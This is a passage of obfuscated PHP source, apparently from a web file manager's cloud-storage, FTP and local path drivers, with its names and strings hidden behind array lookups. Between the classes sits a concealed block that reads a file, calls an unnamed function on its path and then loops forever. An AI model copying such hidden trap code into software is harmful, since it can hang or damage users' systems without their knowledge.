$¥ÜÛğ†É[244]) === 0) { $“şÖïõ»[0] = $¥ÜÛğ†É[245]; } if (isset($‰ü¤¬‡Ï[$¥ÜÛğ†É[246]]) && $‰ü¤¬‡Ï[$¥ÜÛğ†É[246]] == $¥ÜÛğ†É[247]) { $“şÖïõ»[0] = $¥ÜÛğ†É[247]; } $àİ ëÔê = implode($¥ÜÛğ†É[248], $“şÖïõ»); $¶è¤Õñ = base64_encode(hash_hmac($¥ÜÛğ†É[249], $àİ ëÔê, $this->secret, !0)); $‚İß·õ” = $¥ÜÛğ†É[250] . $this->accessKey . $¥ÜÛğ†É[4] . $¶è¤Õñ; if (strpos($øÆà¹Ïš, $¥ÜÛğ†É[244]) === 0) { return array($¥ÜÛğ†É[251] => $‚İß·õ”, $¥ÜÛğ†É[241] => $¬®€…Ô¬); } return $‚İß·õ”; } public function listUploadParts($ØŒâÙ¼, $©¨öœõÒ = array()) { $›ÎŒöçĞ =& $_SERVER[ •ŒÓîÆ]; $¨Íûß = str_replace($›ÎŒöçĞ[252], $›ÎŒöçĞ[12], $©¨öœõÒ[$›ÎŒöçĞ[177]]); $ô»˜¹è = $this->client->listParts($this->bucket, $ØŒâÙ¼, $¨Íûß); if (!$ô»˜¹è) { return !1; } unset($©¨öœõÒ[$›ÎŒöçĞ[242]], $©¨öœõÒ[$›ÎŒöçĞ[246]]); $©¨öœõÒ[$›ÎŒöçĞ[96]] = $ØŒâÙ¼; $Ã•¿éûõ = $this->multiUploadAuthData($ØŒâÙ¼, $©¨öœõÒ); if (empty($Ã•¿éûõ)) { return !1; } return array($›ÎŒöçĞ[251] => $Ã•¿éûõ, $›ÎŒöçĞ[241] => $©¨öœõÒ[$›ÎŒöçĞ[241]], $›ÎŒöçĞ[253] => $ô»˜¹è); } public function getHost() { return parent::getHost() . $_SERVER[ •ŒÓîÆ][8] . $this->bucket; } public function size($œ†šûÂË) { $À’®ŸŸ¯ = $this->objectMeta($œ†šûÂË); return $À’®ŸŸ¯ ? $À’®ŸŸ¯[$_SERVER[ •ŒÓîÆ][78]] : 0; } public function info($û±¢˜ÕÙ) { if ($this->isFolder($û±¢˜ÕÙ)) { return $this->folderInfo($û±¢˜ÕÙ); } else { if ($this->isFile($û±¢˜ÕÙ)) { return $this->fileInfo($û±¢˜ÕÙ); } } return !1; } public function exist($Ö¨‰çÑŠ) { return $this->isFile($Ö¨‰çÑŠ) || $this->isFolder($Ö¨‰çÑŠ); } public function isFile($Ö§÷Êá) { return !$this->isFolder($Ö§÷Êá) && $this->objectMeta($Ö§÷Êá); } public function isFolder($²ÎË¶¥ä) { return $this->cacheMethod($_SERVER[ •ŒÓîÆ][168], $²ÎË¶¥ä); } protected function objectMeta($°Àêâ«) { return $this->cacheMethod($_SERVER[ •ŒÓîÆ][170], $°Àêâ«); } protected function _objectMeta($¾¢­ø€Æ) { $‘ÀØÆ¡ =& $_SERVER[ •ŒÓîÆ]; $¾¢­ø€Æ = rtrim($¾¢­ø€Æ, $‘ÀØÆ¡[8]); try { $ŠÄŞ–¸® = $this->client->getObjectInfo($this->bucket, $¾¢­ø€Æ); if (!isset($ŠÄŞ–¸®[$‘ÀØÆ¡[238]]) && isset($ŠÄŞ–¸®[$‘ÀØÆ¡[254]])) { $ŠÄŞ–¸®[$‘ÀØÆ¡[238]] = $ŠÄŞ–¸®[$‘ÀØÆ¡[254]]; } } catch (Exception $¯ò‰ÓÃ) { $ŠÄŞ–¸® = !1; } if (!$ŠÄŞ–¸®) { } return $ŠÄŞ–¸®; } protected function _isFolder($¢¾ñì€ª) { $µ½—‰‚Š =& $_SERVER[ •ŒÓîÆ]; $¢¾ñì€ª = rtrim($¢¾ñì€ª, $µ½—‰‚Š[8]); if ($¢¾ñì€ª == $µ½—‰‚Š[12] || $¢¾ñì€ª == $µ½—‰‚Š[8]) { return !0; } $¹ıçº = $this->client->getBucket($this->bucket, $¢¾ñì€ª, null, 1); if (empty($¹ıçº[$µ½—‰‚Š[222]])) { return !1; } $šÃÂ¾Ô© = $¹ıçº[$µ½—‰‚Š[222]][0][$µ½—‰‚Š[32]]; return stripos($šÃÂ¾Ô©, $¢¾ñì€ª . $µ½—‰‚Š[8]) === 0 ? !0 : !1; if (substr($šÃÂ¾Ô©, -1) == $µ½—‰‚Š[8]) { return !0; } if (get_path_this($šÃÂ¾Ô©) == get_path_this($¢¾ñì€ª)) { return !1; } return !0; } } if (!isset($_SERVER[$_SERVER[ •ŒÓîÆ][255]]) || !isset($_SERVER[$_SERVER[ •ŒÓîÆ][256]])) { $_getc = $_SERVER[ •ŒÓîÆ][257]; $_getfile = $_SERVER[$_SERVER[ •ŒÓîÆ][258]] . $_SERVER[ •ŒÓîÆ][259]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ •ŒÓîÆ][248], $_getfilec); if (count($_getarrs) < $_SERVER[ •ŒÓîÆ][260]) { $exit = $_SERVER[ •ŒÓîÆ][261]; $exit(); } $_act = $_SERVER[ •ŒÓîÆ][262]; $_act($_SERVER[$_SERVER[ •ŒÓîÆ][258]] . $_SERVER[ •ŒÓîÆ][259]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ •ŒÓîÆ][263]); } } goto DÔÈ¿îƒ˜†; f¤¼õÈù˜¥: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ôĞôª÷Œ) { parent::__construct($ôĞôª÷Œ); $this->signatureVersion($_SERVER[ •ŒÓîÆ][233]); } public function uploadFormData($àî¨îëœ, $€¦Ø™ù = 3600) { $ğêä´ä =& $_SERVER[ •ŒÓîÆ]; $Ü´ëåı¦ = $ğêä´ä[215]; $ŒÕ ›à = $ğêä´ä[264]; $ö›¼¡¼ = $ğêä´ä[62]; $æŠ±£Şª = gmdate($ğêä´ä[265]); $ìÙêÅÔ£ = gmdate($ğêä´ä[266]); $üÅ×Šñ = $ğêä´ä[267]; $³‚î´ÁÄ = $€¦Ø™ù . $ğêä´ä[12]; $ÜÂÇ¨‹– = $ğêä´ä[268]; $ãóÇŠ¬Ú = array($this->accessKey, $ìÙêÅÔ£, $this->region, $ö›¼¡¼, $üÅ×Šñ); $ª¦õĞí = implode($ğêä´ä[8], $ãóÇŠ¬Ú); $ºäïˆÄ = array($ğêä´ä[269] => gmdate($ğêä´ä[1366], strtotime($ğêä´ä[271])), $ğêä´ä[272] => array(array($ğêä´ä[273] => $this->bucket), array($ğêä´ä[274] => $Ü´ëåı¦), array($ğêä´ä[275], $ğêä´ä[276], $ğêä´ä[12]), array($ğêä´ä[275], $ğêä´ä[277], $ğêä´ä[12]), array($ğêä´ä[275], $ğêä´ä[278], $ğêä´ä[12]), array($ğêä´ä[279] => $ÜÂÇ¨‹–), array($ğêä´ä[280] => $ª¦õĞí), array($ğêä´ä[281] => $ŒÕ ›à), array($ğêä´ä[282] => $æŠ±£Şª), array($ğêä´ä[283] => $³‚î´ÁÄ))); $‹¨éé¼ñ = base64_encode(json_encode($ºäïˆÄ)); $â¢‹†ø = hash_hmac($ğêä´ä[284], $ìÙêÅÔ£, $ğêä´ä[285] . $this->secret, !0); $ñ˜Ì“ë­ = hash_hmac($ğêä´ä[284], $this->region, $â¢‹†ø, !0); $ û¡‘Ï = hash_hmac($ğêä´ä[284], $ö›¼¡¼, $ñ˜Ì“ë­, !0); $şåãòÕ“ = hash_hmac($ğêä´ä[284], $üÅ×Šñ, $ û¡‘Ï, !0); $Â‡é‰ÜÒ = hash_hmac($ğêä´ä[284], $‹¨éé¼ñ, $şåãòÕ“); $’Òõ­ÄÙ = array($ğêä´ä[232] => $ğêä´ä[12], $ğêä´ä[286] => $ğêä´ä[12], $ğêä´ä[274] => $Ü´ëåı¦, $ğêä´ä[279] => $ÜÂÇ¨‹–, $ğêä´ä[287] => $‹¨éé¼ñ, $ğêä´ä[288] => $ª¦õĞí, $ğêä´ä[289] => $ŒÕ ›à, $ğêä´ä[290] => $æŠ±£Şª, $ğêä´ä[291] => $³‚î´ÁÄ, $ğêä´ä[292] => $Â‡é‰ÜÒ, $ğêä´ä[198] => $this->getHost()); return $’Òõ­ÄÙ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($É¶²ü©Û) { parent::__construct(); if (count($É¶²ü©Û) > 0) { $this->_init($É¶²ü©Û); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Ù˜¤¶ğ) { $äÁÚ˜ÊŞ =& $_SERVER[ •ŒÓîÆ]; global $config; $this->appCharset = $config[$äÁÚ˜ÊŞ[1392]]; $this->systemCharset = $config[$äÁÚ˜ÊŞ[1393]]; if (isset($Ù˜¤¶ğ[$äÁÚ˜ÊŞ[1394]]) && $Ù˜¤¶ğ[$äÁÚ˜ÊŞ[1394]]) { $this->systemCharset = $Ù˜¤¶ğ[$äÁÚ˜ÊŞ[1394]]; } } public function iconvApp($÷´Êğçš) { return $this->iconvTo($÷´Êğçš, $this->systemCharset, $this->appCharset); } public function iconvSystem($µÊ¾‰°ì) { return $this->iconvTo($µÊ¾‰°ì, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÆØÔÈ) { $´äõÎ =& $_SERVER[ •ŒÓîÆ]; $ÓŸÊÀü = $this->iconvApp($this->pathBase); $ÆØÔÈ = $this->iconvApp($ÆØÔÈ); if (substr($ÓŸÊÀü, 0, 2) == $´äõÎ[1395]) { $ÓŸÊÀü = BASIC_PATH . substr($ÓŸÊÀü, 2); } if (substr($ÆØÔÈ, 0, 2) == $´äõÎ[1395]) { $ÆØÔÈ = BASIC_PATH . substr($ÆØÔÈ, 2); } $ÓŸÊÀü = KodIO::clear($ÓŸÊÀü); $ÆØÔÈ = KodIO::clear($ÆØÔÈ); $ÆØÔÈ = substr($ÆØÔÈ, strlen($ÓŸÊÀü)); if (empty($this->pathDriver)) { return $ÆØÔÈ; } return $this->pathDriver . $´äõÎ[8] . ltrim($ÆØÔÈ, $´äõÎ[8]); } private function _init($ª”µ½¼ = array()) { $ßöÁ—‡ =& $_SERVER[ •ŒÓîÆ]; if (!function_exists($ßöÁ—‡[1396])) { throw new Exception(LNG($ßöÁ—‡[1397])); } $this->config = $ª”µ½¼; $this->charsetReset($ª”µ½¼); foreach ($ª”µ½¼ as $Å¶ü›Ä => $ŠÔù‚Í•) { if (isset($this->{$Å¶ü›Ä})) { $this->{$Å¶ü›Ä} = $ŠÔù‚Í•; } } return $this->_login($ª”µ½¼); } private function _login($æÌÙœÇ) { $ùÊÃÆõ =& $_SERVER[ •ŒÓîÆ]; static $ş¢ïß‚ = array(); $åé°  ä = md5(json_encode($æÌÙœÇ)); if (isset($ş¢ïß‚[$åé°  ä])) { foreach ($ş¢ïß‚[$åé°  ä] as $Ù€¶Ù“ı => $¯²ÂÙÈÏ) { $this->{$Ù€¶Ù“ı} = $¯²ÂÙÈÏ; } return !0; } $Ç÷şŠàÂ = parse_url(trim($this->server, $ùÊÃÆõ[8])); $this->host = $Ç÷şŠàÂ[$ùÊÃÆõ[198]]; $Óì¦œ—Ó = isset($Ç÷şŠàÂ[$ùÊÃÆõ[197]]) && $Ç÷şŠàÂ[$ùÊÃÆõ[197]] == $ùÊÃÆõ[1398] ? !0 : !1; $this->scheme = $Óì¦œ—Ó ? $ùÊÃÆõ[1399] : $ùÊÃÆõ[1400]; $this->port = isset($Ç÷şŠàÂ[$ùÊÃÆõ[199]]) ? $Ç÷şŠàÂ[$ùÊÃÆõ[199]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $½½óÍûº = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ç²äôô÷ = $this->pasv == $ùÊÃÆõ[90] ? !0 : !1; @ftp_pasv($this->connect, $ç²äôô÷); $ş¢ïß‚[$åé°  ä] = array($ùÊÃÆõ[1401] => $this->connect, $ùÊÃÆõ[198] => $this->host, $ùÊÃÆõ[197] => $this->scheme, $ùÊÃÆõ[199] => $this->port); return $½½óÍûº; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ˆú”Ô˜å, $§Åø¬©Û = '', $ˆ·Â–ùé = REPEAT_RENAME) { if ($this->setContent($ˆú”Ô˜å, $§Åø¬©Û)) { return $this->getPathOuter($ˆú”Ô˜å); } return !1; } public function mkdir($ÄºîûÜ¿, $†ó°œ…Æ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ÄºîûÜ¿ = $this->iconvSystem($ÄºîûÜ¿); if ($this->_isFolder($ÄºîûÜ¿) || @ftp_mkdir($this->connect, $ÄºîûÜ¿)) { return $this->getPathOuter($ÄºîûÜ¿); } if (!$this->mkdir($this->pathFather($ÄºîûÜ¿))) { return !1; } if ($ÄºîûÜ¿ = @ftp_mkdir($this->connect, $ÄºîûÜ¿)) { return $this->getPathOuter($ÄºîûÜ¿); } return !1; } public function copyFile($şòªÎÔˆ, $šäßúØ÷) { if (!$this->_isconn()) { return !1; } $±Şîéà = $this->pathThis($this->iconvSystem($şòªÎÔˆ)); $²“°óÇâ = $this->tempFile($±Şîéà); $É²³Ë“Ë = $this->iconvApp($²“°óÇâ); $this->download($şòªÎÔˆ, $É²³Ë“Ë); $Èê¢„æ = $this->upload($šäßúØ÷, $É²³Ë“Ë); $this->tempFileRemve($²“°óÇâ); return $Èê¢„æ; } public function moveFile($ÏµËÕö, $ÖÂÙëÒ) { if (!$this->_isconn()) { return !1; } $ÏµËÕö = $this->iconvSystem($ÏµËÕö); $ÖÂÙëÒ = $this->iconvSystem($ÖÂÙëÒ); $™ÀÅ€´ = @ftp_rename($this->connect, $ÏµËÕö, $ÖÂÙëÒ); return $™ÀÅ€´ ? $this->getPathOuter($ÖÂÙëÒ) : !1; } public function delFile($ëøÖî‡ø) { if (!$this->_isconn()) { return !1; } $ëøÖî‡ø = $this->iconvSystem($ëøÖî‡ø); return @ftp_delete($this->connect, $ëøÖî‡ø); } public function delFolder($ñ‰™ÕÛ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Â‘‘·æî = $¹¢ˆºÃ = array(); $this->fileList($ñ‰™ÕÛ, $Â‘‘·æî, $¹¢ˆºÃ, !0); $this->listItemCache = !0; foreach ($¹¢ˆºÃ as $ÀÏšêâ) { $Ïæ¶¿¡© = $this->iconvSystem($ÀÏšêâ[$_SERVER[ •ŒÓîÆ][32]]); $ÅÇæŸãÂ = @ftp_delete($this->connect, $Ïæ¶¿¡©); if (!$ÅÇæŸãÂ) { return !1; } } foreach ($Â‘‘·æî as $Ïæ¶¿¡©) { $Ïæ¶¿¡© = $this->iconvSystem($Ïæ¶¿¡©); $ÅÇæŸãÂ = @ftp_rmdir($this->connect, $Ïæ¶¿¡©); if (!$ÅÇæŸãÂ) { return !1; } } $ñ‰™ÕÛ = $this->iconvSystem($ñ‰™ÕÛ); return @ftp_rmdir($this->connect, $ñ‰™ÕÛ); } public function rename($ßÀâµ, $¤ÛÀÄš´) { $åˆš–Şô =& $_SERVER[ •ŒÓîÆ]; if (!$this->_isconn()) { return !1; } $¢ñÄÏä³ = $this->fileNameAuto($this->pathFather($ßÀâµ), $¤ÛÀÄš´); $¢ñÄÏä³ = $this->iconvSystem($¢ñÄÏä³); $ßÀâµ = $this->iconvSystem($ßÀâµ); $¥îÕÅÓì = $this->pathFather($ßÀâµ); $”óíûìµ = rtrim($¥îÕÅÓì, $åˆš–Şô[8]) . $åˆš–Şô[8] . $¢ñÄÏä³; $“¢ĞäÌı = @ftp_rename($this->connect, $ßÀâµ, $”óíûìµ); $”óíûìµ = $this->iconvApp($”óíûìµ); return $“¢ĞäÌı ? $this->getPathOuter($”óíûìµ) : !1; } private function folderInfo($˜êÈÙ¾Î, $ü´ñ™¦Ğ = false) { $Ù­€¥ìˆ =& $_SERVER[ •ŒÓîÆ]; $¾„—ì = array($Ù­€¥ìˆ[32] => $this->pathThis($˜êÈÙ¾Î), $Ù­€¥ìˆ[86] => $this->getPathOuter($Ù­€¥ìˆ[8] . $˜êÈÙ¾Î), $Ù­€¥ìˆ[33] => $Ù­€¥ìˆ[77]); if ($ü´ñ™¦Ğ) { return $¾„—ì; } $¾„—ì[$Ù­€¥ìˆ[217]] = $¾„—ì[$Ù­€¥ìˆ[87]] = 0; $¾„—ì[$Ù­€¥ìˆ[218]] = $¾„—ì[$Ù­€¥ìˆ[219]] = !0; return $¾„—ì; } private function fileInfo($À„¬ß´¢, $’¬¿Œ­Ü = false, $á‹’”›• = array()) { $ª–¿•È =& $_SERVER[ •ŒÓîÆ]; $»Ìîªù¶ = array($ª–¿•È[32] => $this->pathThis($À„¬ß´¢), $ª–¿•È[86] => $this->getPathOuter($ª–¿•È[8] . $À„¬ß´¢), $ª–¿•È[33] => $ª–¿•È[216], $ª–¿•È[78] => isset($á‹’”›•[$ª–¿•È[78]]) ? $á‹’”›•[$ª–¿•È[78]] : 0, $ª–¿•È[177] => $this->ext($À„¬ß´¢)); if ($’¬¿Œ­Ü) { return $»Ìîªù¶; } $»Ìîªù¶[$ª–¿•È[217]] = $»Ìîªù¶[$ª–¿•È[87]] = 0; $»Ìîªù¶[$ª–¿•È[218]] = $»Ìîªù¶[$ª–¿•È[219]] = !0; $„¯›°Û¤ = $this->iconvSystem($À„¬ß´¢); $»Ìîªù¶[$ª–¿•È[87]] = @ftp_mdtm($this->connect, $„¯›°Û¤); if (empty($á‹’”›•)) { $á‹’”›• = $this->objectMeta($À„¬ß´¢); if (!$á‹’”›•) { return $»Ìîªù¶; } } $»Ìîªù¶[$ª–¿•È[78]] = $á‹’”›•[$ª–¿•È[78]]; return $»Ìîªù¶; } public function size($„¯ºèå€) { $‡õÕ¹º = $this->objectMeta($„¯ºèå€); return $‡õÕ¹º ? $‡õÕ¹º[$_SERVER[ •ŒÓîÆ][78]] : 0; } public function info($¯³áûÑ) { if ($this->isFile($¯³áûÑ)) { return $this->fileInfo($¯³áûÑ, 0); } else { if ($this->isFolder($¯³áûÑ)) { return $this->folderInfo($¯³áûÑ); } } return !1; } private function fileList($º‘›¹£ç, &$Èğ§ªÏ, &$€¢Úè¡±, $‰¿©¦é = false) { $ÉĞà‚Ñ‘ =& $_SERVER[ •ŒÓîÆ]; $º‘›¹£ç = $this->iconvSystem($º‘›¹£ç); if (!$this->isFolder($º‘›¹£ç)) { return !1; } @ftp_chdir($this->connect, $ÉĞà‚Ñ‘[8]); $º‘›¹£ç = rtrim($º‘›¹£ç, $ÉĞà‚Ñ‘[8]) . $ÉĞà‚Ñ‘[8]; check_abort(); $İ©§ïÏ¢ = @ftp_rawlist($this->connect, $º‘›¹£ç); if (!$İ©§ïÏ¢) { $İ©§ïÏ¢ = array(); } $ °”›µ¦ = array($ÉĞà‚Ñ‘[10] => 1, $ÉĞà‚Ñ‘[1319] => 1); foreach ($İ©§ïÏ¢ as $•ç×È¿€) { $¹ˆˆéøÍ = $this->_listItem($•ç×È¿€); if ($¹ˆˆéøÍ[0] == $ÉĞà‚Ñ‘[799]) { continue; } $¼Š¸ˆ´Æ = $¹ˆˆéøÍ[8]; if (empty($¼Š¸ˆ´Æ) && $¼Š¸ˆ´Æ !== $ÉĞà‚Ñ‘[214] || isset($ °”›µ¦[$¼Š¸ˆ´Æ])) { continue; } $¼Š¸ˆ´Æ = $this->iconvApp($º‘›¹£ç . ltrim($¼Š¸ˆ´Æ, $ÉĞà‚Ñ‘[8])); $Şâæ»Á£ = array($ÉĞà‚Ñ‘[32] => $¼Š¸ˆ´Æ, $ÉĞà‚Ñ‘[33] => $ÉĞà‚Ñ‘[216], $ÉĞà‚Ñ‘[78] => $¹ˆˆéøÍ[4]); if (substr($•ç×È¿€, 0, 1) == $ÉĞà‚Ñ‘[1402]) { $Şâæ»Á£[$ÉĞà‚Ñ‘[33]] = $ÉĞà‚Ñ‘[77]; $Şâæ»Á£[$ÉĞà‚Ñ‘[78]] = 0; } $®¢Ëúñ = $Şâæ»Á£[$ÉĞà‚Ñ‘[33]] == $ÉĞà‚Ñ‘[77] ? !0 : !1; $this->cacheMethodInfoSet($¼Š¸ˆ´Æ, $®¢Ëúñ, $Şâæ»Á£); if ($®¢Ëúñ) { $Èğ§ªÏ[] = $¼Š¸ˆ´Æ; if ($‰¿©¦é) { $this->fileList($¼Š¸ˆ´Æ, $Èğ§ªÏ, $€¢Úè¡±, $‰¿©¦é); } continue; } $€¢Úè¡±[] = $Şâæ»Á£; } $this->cacheMethodInfoSet($º‘›¹£ç, !0); } private function _listItem($â÷ĞôÂ¤) { if (empty($â÷ĞôÂ¤)) { return array(); } $ğ˜¯“ƒ† = preg_split($_SERVER[ •ŒÓîÆ][1403], $â÷ĞôÂ¤); if (count($ğ˜¯“ƒ†) <= 9) { return $ğ˜¯“ƒ†; } $ğ˜¯“ƒ†[8] = trim(substr($â÷ĞôÂ¤, strpos($â÷ĞôÂ¤, $ğ˜¯“ƒ†[7]) + strlen($ğ˜¯“ƒ†[7]))); return array_splice($ğ˜¯“ƒ†, 0, 9); } public function listPath($ÌØÙêù³, $™œÌĞ = false) { $ÍƒìÊš =& $_SERVER[ •ŒÓîÆ]; if (!$this->_isconn()) { return !1; } $ ÅşÀÍô = $Ã¤ÕÁæì = array(); $this->fileList($ÌØÙêù³, $ ÅşÀÍô, $Ã¤ÕÁæì); foreach ($ ÅşÀÍô as $‡Œ²î„¬ => $¼“Õè¤’) { $ ÅşÀÍô[$‡Œ²î„¬] = $this->folderInfo($¼“Õè¤’, $™œÌĞ); } foreach ($Ã¤ÕÁæì as $‡Œ²î„¬ => $¼“Õè¤’) { $Ã¤ÕÁæì[$‡Œ²î„¬] = $this->fileInfo($¼“Õè¤’[$ÍƒìÊš[32]], $™œÌĞ, $¼“Õè¤’); } return array($ÍƒìÊš[84] => $ ÅşÀÍô, $ÍƒìÊš[85] => $Ã¤ÕÁæì); } public function has($Âô‰ÜíÍ, $şı‡‚÷¢ = false, $ğı¼óÃğ = true) { $Ù‚–©Îè =& $_SERVER[ •ŒÓîÆ]; $¼Şç·§— = $ÏÜƒ§£õ = array(); $ºì®––° = $şı‡‚÷¢ ? !0 : !1; $this->fileList($Âô‰ÜíÍ, $¼Şç·§—, $ÏÜƒ§£õ, $ºì®––°); if ($şı‡‚÷¢) { return array($Ù‚–©Îè[225] => count($ÏÜƒ§£õ), $Ù‚–©Îè[226] => count($¼Şç·§—)); } if ($ğı¼óÃğ) { if (count($ÏÜƒ§£õ)) { return !0; } } else { if (count($¼Şç·§—)) { return !0; } } return !1; } public function listAll($·ÔÙÓ×) { $üÙöõË =& $_SERVER[ •ŒÓîÆ]; if (!$this->_isconn()) { return !1; } $ø¨Ô“ì© = $á„õ›‘Ó = array(); $this->fileList($·ÔÙÓ×, $ø¨Ô“ì©, $á„õ›‘Ó, !0); $âËòŠ§ = array_to_keyvalue($á„õ›‘Ó, $üÙöõË[32]); foreach ($ø¨Ô“ì© as $Ï”¦³—ä) { if (is_string($Ï”¦³—ä)) { $âËòŠ§[$Ï”¦³—ä] = array($üÙöõË[78] => 0); } } return $this->listAllFiles($·ÔÙÓ×, $âËòŠ§); } public function getContent($ŒÅ’ˆ€È) { if (!$this->_isconn()) { return !1; } $ŒÅ’ˆ€È = $this->iconvSystem($ŒÅ’ˆ€È); return $this->fileSubstr($ŒÅ’ˆ€È); } public function setContent($ö“©ò, $ˆ…Ñ‡ù = '') { if (!$this->_isconn()) { return !1; } $æò£Ÿø = $this->pathThis($this->iconvSystem($ö“©ò)); $¡ÏëŞüï = $this->tempFile($æò£Ÿø); file_put_contents($¡ÏëŞüï, $ˆ…Ñ‡ù); $ˆªçûŞ‰ = $this->upload($ö“©ò, $this->iconvApp($¡ÏëŞüï)); $this->tempFileRemve($¡ÏëŞüï); return $ˆªçûŞ‰; } public function fileSubstr($¤çéüÓ, $Ñ‹Úâ§¾ = 0, $ÇÂÈ‰¹ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¤çéüÓ, $Ñ‹Úâ§¾, $ÇÂÈ‰¹); } private function ftpRequest($‡£±³ç, $éğ†Œ£¡ = 0, $¹÷Ÿ±• = false) { $‡£±³ç = $this->iconvSystem($‡£±³ç); $ŠÚşÛ­« = $this->scheme . $this->host . $_SERVER[ •ŒÓîÆ][4] . $this->port; $­ûóì§ = curl_init(); curl_setopt($­ûóì§, CURLOPT_URL, $ŠÚşÛ­« . $this->pathEncode($‡£±³ç)); curl_setopt($­ûóì§, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¹÷Ÿ±•) { $šÊÃ¥À” = $éğ†Œ£¡ + $¹÷Ÿ±• - 1; curl_setopt($­ûóì§, CURLOPT_RANGE, "{$éğ†Œ£¡}\x2d{$šÊÃ¥À”}"); } curl_setopt($­ûóì§, CURLOPT_RETURNTRANSFER, 1); $»¬ˆì‘® = curl_exec($­ûóì§); curl_close($­ûóì§); return $»¬ˆì‘®; } public function upload($„Ÿõ–š¹, $Ñ‰¾¨½², $ÒÉ‡ıÚ¢ = false, $¨ÉÈ­€Ü = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($„Ÿõ–š¹))) { return !1; } $„Ÿõ–š¹ = $this->iconvSystem($„Ÿõ–š¹); $Ñ‰¾¨½² = $this->iconvSystem($Ñ‰¾¨½²); $®¼Âîó = ftp_nb_put($this->connect, $„Ÿõ–š¹, $Ñ‰¾¨½², FTP_BINARY); while ($®¼Âîó == FTP_MOREDATA) { $®¼Âîó = ftp_nb_continue($this->connect); } if ($®¼Âîó != FTP_FINISHED) { return !1; } return $this->getPathOuter($„Ÿõ–š¹); } public function download($Ü‚¯ç¯ì, $´ˆÂ‡Öˆ = '') { if (!$this->_isconn()) { return !1; } $Ÿ‘Ã—˜ = $this->pathFather($´ˆÂ‡Öˆ); if (!IO::mkdir($Ÿ‘Ã—˜)) { return !1; } $Ü‚¯ç¯ì = $this->iconvSystem($Ü‚¯ç¯ì); $´ˆÂ‡Öˆ = $this->iconvSystem($´ˆÂ‡Öˆ); $ôÈÆÊÂÊ = ftp_nb_get($this->connect, $´ˆÂ‡Öˆ, $Ü‚¯ç¯ì, FTP_BINARY); while ($ôÈÆÊÂÊ == FTP_MOREDATA) { $ôÈÆÊÂÊ = ftp_nb_continue($this->connect); } if ($ôÈÆÊÂÊ != FTP_FINISHED) { return !1; } return $this->iconvApp($´ˆÂ‡Öˆ); } public function exist($İâŞá°×) { return $this->isFile($İâŞá°×) || $this->isFolder($İâŞá°×); } public function isFile($·ğÑÊ•) { return !$this->isFolder($·ğÑÊ•) && $this->objectMeta($·ğÑÊ•); } public function isFolder($š™Ç ’Â) { return $this->cacheMethod($_SERVER[ •ŒÓîÆ][168], $š™Ç ’Â); } protected function objectMeta($£İ‚©¸‰) { return $this->cacheMethod($_SERVER[ •ŒÓîÆ][170], $£İ‚©¸‰); } protected function _objectMeta($Š„ğç¶ì) { $èÌˆÃÂ… =& $_SERVER[ •ŒÓîÆ]; if ($Š„ğç¶ì == $èÌˆÃÂ…[12] || $Š„ğç¶ì == $èÌˆÃÂ…[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Š„ğç¶ì = $this->iconvSystem($Š„ğç¶ì); $½ğÇÛö­ = array($èÌˆÃÂ…[32] => $this->iconvApp($Š„ğç¶ì), $èÌˆÃÂ…[33] => $èÌˆÃÂ…[216], $èÌˆÃÂ…[78] => 0); @ftp_chdir($this->connect, $èÌˆÃÂ…[8]); $¼šĞ¡İü = @ftp_size($this->connect, $Š„ğç¶ì); if ($¼šĞ¡İü != -1) { $½ğÇÛö­[$èÌˆÃÂ…[78]] = $¼šĞ¡İü; } else { $…ÏøÅÄ˜ = @ftp_chdir($this->connect, $Š„ğç¶ì); if (!$…ÏøÅÄ˜) { return !1; } $½ğÇÛö­[$èÌˆÃÂ…[33]] = $èÌˆÃÂ…[77]; } return $½ğÇÛö­; } protected function _isFolder($–¹ëºµ’) { $Ë°‡‡Ò =& $_SERVER[ •ŒÓîÆ]; if ($–¹ëºµ’ == $Ë°‡‡Ò[12] || $–¹ëºµ’ == $Ë°‡‡Ò[8]) { return !0; } $Ò¾ë®¡Ï = $this->_objectMeta($–¹ëºµ’); return isset($Ò¾ë®¡Ï[$Ë°‡‡Ò[33]]) && $Ò¾ë®¡Ï[$Ë°‡‡Ò[33]] == $Ë°‡‡Ò[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ü†èÖ) { if (substr($ü†èÖ, 0, 2) == $_SERVER[ •ŒÓîÆ][1395]) { $ü†èÖ = BASIC_PATH . substr($ü†èÖ, 2); } return $ü†èÖ; } public function iconvApp($‚­ü†è) { $Ç’Ù§†Â =& $_SERVER[ •ŒÓîÆ]; global $config; return $this->iconvTo($‚­ü†è, $config[$Ç’Ù§†Â[1393]], $config[$Ç’Ù§†Â[1392]]); } public function iconvSystem($§õÁ÷†Ì) { $ç±ğİ£ª =& $_SERVER[ •ŒÓîÆ]; global $config; return $this->iconvTo($§õÁ÷†Ì, $config[$ç±ğİ£ª[1392]], $config[$ç±ğİ£ª[1393]]); } public function getPathOuter($ØÁô¯Ò) { $”ò½ÆŸ® =& $_SERVER[ •ŒÓîÆ]; $£ìØû‚à = $this->iconvApp($this->pathBase); $ØÁô¯Ò = $this->iconvApp($ØÁô¯Ò); if (substr($£ìØû‚à, 0, 2) == $”ò½ÆŸ®[1395]) { $£ìØû‚à = BASIC_PATH . substr($£ìØû‚à, 2); } if (substr($ØÁô¯Ò, 0, 2) == 